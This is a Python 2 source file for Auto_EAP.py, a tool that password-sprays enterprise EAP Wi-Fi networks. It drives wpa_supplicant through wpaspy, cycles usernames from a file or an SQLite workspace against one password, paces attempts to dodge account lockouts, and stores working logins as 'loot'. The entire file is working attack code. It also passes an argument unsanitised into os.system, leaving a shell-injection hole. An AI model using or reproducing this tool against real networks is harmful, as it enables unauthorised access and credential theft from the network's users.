#!/usr/bin/env python

#Author: Tylous

#Auto_EAP.py is a script designed to perform automated brute-force authentication attacks against various types of EAP networks. 
#Using the python library wpaspy, created by Jouni Malinen <j@w1.fi> to interact with the wpa_supplicant damon, 
#automated authentication attacks can be preformed with the intent of not causing account lock-outs.



import argparse
import time
import wpaspy
import os
import sys
sys.path.insert(0, '../../lib/')
from Queries import *
import pandas as dp
import sqlite3

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='The Interface to use\n', required=True)
parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help='The SSID to attack', required=True)
parser.add_argument('-U', '--User', metavar='Usernamefile', dest='usernamefile', action='store', help='Path to username file\n', required=False)
parser.add_argument('-W', '--workspace', metavar='workspace', dest='workspace', action='store', help='Workspace name\n', required=False)
parser.add_argument('-p', '--password', metavar='Password', dest='password', action='store', help='Password to use\n', required=True)
parser.add_argument('-K', '--key_mgmt', metavar='Key_mgmt', dest='key_mgmt', action='store', help='Key_Management type to use\n', required=True)
parser.add_argument('-E', '--eap_type', metavar='Eap_type', dest='eap_type', action='store', help='Eap type to use\n', required=True)
args = parser.parse_args()



wpas_ctrl = '/var/run/wpa_supplicant'

#Sets the wpa_supplicant conf, CLI interpreter and the interface to be used####
def wpas_connect():
	os.system('wpa_supplicant -i' + args.interface +' -c lib/wpa_supplicant.conf -K -B > /dev/null')
	ifaces = []
	if os.path.isdir(wpas_ctrl):
		try:
			ifaces = [os.path.join(wpas_ctrl, i) for i in os.listdir(wpas_ctrl)]
		except OSError, error:
			print "Could not find wpa_supplicant: ", error
			return None

	if len(ifaces) < 1:
		print "No wpa_supplicant control interface found"
		return None

	for ctrl in ifaces:
		try:
			wpas = wpaspy.Ctrl(ctrl)
			return wpas
		except Exception, e:
			pass
		return None


#Configures the supplicant and performs the automated attack#
def main():
	try:
		failed = ('\033[91m' + 'FAILED' + '\033[0m')
		success = ('\033[92m' + 'SUCCESS' + '\033[0m')
		password = (args.password)
		print "Initialized..."
		wpa = wpas_connect()
		if wpa is None:
			return
		wpa.attach()
		wpa.request('ADD_NETWORK')
		wpa.request('SET_NETWORK 0 ssid "' + args.ssid + '"')
		wpa.request('SET_NETWORK 0 key_mgmt ' + args.key_mgmt +' ')
		wpa.request('SET_NETWORK 0 eap ' + args.eap_type +' ')

		if bool(args.usernamefile):
			try:
				f = open(args.usernamefile)
				usernames = f.readlines()
			except IOError: 
				print "Can't read "+args.usernamefile
				sys.exit(1)

		else:
		#if bool(args.workspace):
			try:
				con = sqlite3.connect('../../'+args.workspace)
				if dp.read_sql('select USERNAME from EAP', con).empty:
					print "No usernames found in EAP table, please try a different option."
					sys.exit(1)
				else:	
					usernames = dp.read_sql('select USERNAME from EAP', con).to_string(justify='left', index=False, header=False).replace(" ","").split('\n')

			except dp.io.sql.DatabaseError:
				print "can't read SQL"
				sys.exit(1)
		#else:
		#	username = (args.username)
		#LOoper#
		for username in usernames:
			wpa.request('SET_NETWORK 0 identity "' + username.rstrip(os.linesep) + '"')
			wpa.request('SET_NETWORK 0 anonymous_identity "' + username.rstrip(os.linesep) + '"')
			wpa.request('SET_NETWORK 0 password "' + password + '"')
			wpa.request('ENABLE_NETWORK 0')
			sys.stdout.write ('Trying Username ' + username.rstrip(os.linesep) + ' with Password ' + password + ': ')
			wpa.request('LOGON')
			time.sleep(4)
			count= 0
			while count < 10:
				count +=1
				time.sleep(1)
				while wpa.pending():
					resp = wpa.recv()
					if 'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully' in  resp:
						print success
						loot = {'MAC': '','Password': '','Username': ''}
						loot.update(MAC = "N/A") 
						loot.update(Password = password)
						loot.update(Username = username.rstrip(os.linesep))
						d = queries()
						d.db_connect('../../'+args.workspace)
						d.loot(loot)
						count=11
						break
					if 'CTRL-EVENT-EAP-FAILURE EAP authentication failed' in resp:
						print failed 
						count=11
						break
				if count == 10:
					print failed		
			wpa.request('DISABLE_NETWORK 0')
			time.sleep(2)
		wpa.request('REMOVE_NETWORK 0')
		print 'Completed'
		wpa.detach()
		wpa.request('TERMINATE')
	except KeyboardInterrupt:
			wpa.request('TERMINATE')
			time.sleep(2)
			print '\n'
			print 'Shutting Down'
if __name__ == "__main__":
	main()
	sys.exit(0)
